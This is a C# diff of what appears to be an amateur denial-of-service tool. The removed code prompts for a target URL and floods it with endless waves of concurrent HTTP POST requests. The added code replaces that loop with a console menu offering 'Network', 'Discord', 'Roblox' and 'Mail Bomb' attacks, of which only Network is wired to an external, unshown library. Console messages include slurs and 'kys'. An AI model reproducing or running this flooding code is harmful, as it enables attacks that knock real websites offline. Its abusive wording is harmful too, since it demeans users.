@@ -2,108 +2,110 @@
 using System.Net.Http;
 using System.Threading;
 using System.Threading.Tasks;
+using VortexLibraries;
+using System.Diagnostics;
 
-namespace DDoS
+using System.Net.Security;
+using System.Security.Cryptography.X509Certificates;
+
+namespace CounterDDoS
 {
-    class Program
+    sealed internal class Program
     {
-        private static readonly HttpClient client = new HttpClient();
-        static string url = "";
-        static int count = 0;
-
-        static async Task SendHTTP()
+        static string[][] options =
         {
-            try
-            {
-                // Create the request
-                var request = new HttpRequestMessage(HttpMethod.Post, url); // or https://incr.easrng.net/badge?key=dedigger
+            new[] {"Network", "Windows", "Discord"},
+            new[] { "Roblox", "Mail Bomb" }
+        };
 
-                // Add headers
-                request.Headers.Add("skibidi", "Hello from France!");
-                request.Headers.Referrer = new Uri(url);
+        static int selectedRow = 0;
+        static int selectedColumn = 0;
+        static int OptionWidth = 12;
 
-                // Set the content of the request (with the correct Content-Type header)
-                request.Content = new StringContent("", System.Text.Encoding.UTF8, "text/plain");
-
-                // Send the request
-                HttpResponseMessage response = await client.SendAsync(request);
-                count += 1;
-
-                Console.ForegroundColor = ConsoleColor.Green;
-                Console.Write($"\n[#{count.ToString()} {response.StatusCode.ToString()}]:");
-                Console.ForegroundColor = ConsoleColor.Magenta;
-                Console.Write(" Message sent");
-
-            }
-            catch (Exception e)
-            {
-                Console.WriteLine($"Exception: {e.Message}");
-            }
-        }
-
-        static bool IsValidUrl(string url)
+        static async Task Main()
         {
-            return Uri.TryCreate(url, UriKind.Absolute, out Uri uriResult)
-                   && (uriResult.Scheme == Uri.UriSchemeHttp || uriResult.Scheme == Uri.UriSchemeHttps);
-        }
-
-
-        static async Task Main(string[] args)
-        {
-            Console.ForegroundColor = ConsoleColor.Red;
-            Console.WriteLine(@"╔═════════════════════════════════════════════════════════════════════════╗
-║ ██████╗░███████╗░█████╗░████████╗  ███╗░░░███╗███████╗░█████╗░████████╗ ║
-║ ██╔══██╗██╔════╝██╔══██╗╚══██╔══╝  ████╗░████║██╔════╝██╔══██╗╚══██╔══╝ ║
-║ ██████╦╝█████╗░░███████║░░░██║░░░  ██╔████╔██║█████╗░░███████║░░░██║░░░ ║
-║ ██╔══██╗██╔══╝░░██╔══██║░░░██║░░░  ██║╚██╔╝██║██╔══╝░░██╔══██║░░░██║░░░ ║
-║ ██████╦╝███████╗██║░░██║░░░██║░░░  ██║░╚═╝░██║███████╗██║░░██║░░░██║░░░ ║
-║ ╚═════╝░╚══════╝╚═╝░░╚═╝░░░╚═╝░░░  ╚═╝░░░░░╚═╝╚══════╝╚═╝░░╚═╝░░░╚═╝░░░ ║
-╚═════════════════════════════════════════════════════════════════════════╝
-");
-
-            string link;
-            while (true) {
-                Console.ForegroundColor = ConsoleColor.Magenta;
-                Console.Write("give link or gay: ");
-                Console.ForegroundColor = ConsoleColor.Cyan;
-                string response = Console.ReadLine();
-                if (IsValidUrl(response)) {
-                    link = response;
-                    break;
-                } else
-                {
-                    Console.ForegroundColor = ConsoleColor.Red;
-                    Console.Write("bruh ts pmo my sigma icl pls lock in n gimme smth da bonkers url \n");
-                }
-            }
-
-            int taskCount;
-            while (true) {
-                Console.ForegroundColor = ConsoleColor.Magenta;
-                Console.Write("how many requests per task: ");
-                Console.ForegroundColor = ConsoleColor.Cyan;
-                string response = Console.ReadLine();
-                if (int.TryParse(response, out taskCount) && taskCount>0)
-                {
-                    break;
-                } else
-                {
-                    Console.ForegroundColor = ConsoleColor.Red;
-                    Console.Write("bruh ts pmo my sigma icl pls lock in n gimme a num more skibidi fr (i aint askin' 4 ur phone num xDDD LOL)\n");
-                }
-            }
-            
-            url = link;
-
-            var tasks = new Task[taskCount]; // send 100 requests at once
+            Console.CursorVisible = false;
             while (true)
             {
-                for (int i = 0; i < tasks.Length; i++)
+                Console.Clear();
+                DisplayMenu();
+
+                ConsoleKey key = Console.ReadKey(true).Key;
+                if (key == ConsoleKey.UpArrow         && selectedRow > 0 && selectedColumn < options[selectedRow-1].Length && options[selectedRow-1][selectedColumn] != null) { selectedRow--; }
+                else if (key == ConsoleKey.DownArrow  && selectedRow < options.Length-1 && selectedColumn < options[selectedRow+1].Length && options[selectedRow+1][selectedColumn] != null) { selectedRow++; }
+                else if (key == ConsoleKey.LeftArrow  && selectedColumn > 0 && options[selectedRow][selectedColumn-1] != null) { selectedColumn--; }
+                else if (key == ConsoleKey.RightArrow && selectedColumn < options[selectedRow].Length-1 && options[selectedRow][selectedColumn+1] != null) { selectedColumn++; }
+                else if (key == ConsoleKey.Enter)
                 {
-                    tasks[i] = SendHTTP();
+                    Console.Clear();
+                    //Console.WriteLine($"You selected: {options[selectedRow][selectedColumn]}");
+                    switch (options[selectedRow][selectedColumn])
+                    {
+                        case "Network":
+                            await VortexHttp.Init();
+                            break;
+
+                        default:
+                            Console.WriteLine("kys we didn't script that yet");
+                            await Task.Delay(-1);
+                            break;
+                    }
+                    break;
                 }
-                await Task.WhenAll(tasks); // wait for all to finish before doing another wave
             }
+        }
+
+    static void DisplayMenu()
+        {
+            TitlePrint.Print();
+            Console.WriteLine("\n");
+
+            int TotalWidth = (OptionWidth + 4) * 3 + 3 + 2;
+            Action center = () => { Console.SetCursorPosition((Console.WindowWidth - TotalWidth) / 2, Console.CursorTop); };
+            Action SetFrameColor = () => { Console.ForegroundColor = ConsoleColor.DarkMagenta; };
+
+            SetFrameColor();
+            center(); Console.WriteLine("╔" + new string('═', TotalWidth - 2) + "╗");
+            center(); Console.WriteLine("║" + new string(' ', TotalWidth - 2) + "║");
+            for (int i = 0; i < options.Length; i++)
+            {
+                Console.SetCursorPosition((Console.WindowWidth - TotalWidth)/2, Console.CursorTop);
+                SetFrameColor();
+                Console.Write("║   ");
+                for (int j = 0; j < options[i].Length; j++)
+                {
+                    if (options[i][j] == null)
+                    {
+                        Console.Write(new string(' ', OptionWidth+4));
+                        continue;
+                    }
+
+                    if (i == selectedRow && j == selectedColumn)
+                    {
+                        /*Console.ForegroundColor = ConsoleColor.Green;
+                        Console.Write($"> {options[i][j]} ");
+                        Console.ResetColor();*/
+                        string SpaceLeft = new string(' ', OptionWidth - options[i][j].Length);
+                        Console.ForegroundColor = ConsoleColor.Green;
+                        Console.Write($"> {"["+options[i][j]+"]"}{SpaceLeft}");
+                        Console.ResetColor();
+                    }
+                    else
+                    {
+                        Console.ForegroundColor = ConsoleColor.Red;
+                        string SpaceLeft = new string(' ', OptionWidth - options[i][j].Length);
+                        Console.Write($"  [{options[i][j]}]{SpaceLeft}");
+                    }
+                }
+                Console.SetCursorPosition((Console.WindowWidth + TotalWidth)/2-1, Console.CursorTop);
+                SetFrameColor();
+                Console.Write("║");
+                Console.WriteLine();
+            }
+
+            SetFrameColor();
+            center(); Console.WriteLine("║" + new string(' ', TotalWidth - 2) + "║");
+            center(); Console.WriteLine("╚" + new string('═', TotalWidth - 2) + "╝");
         }
     }
 }
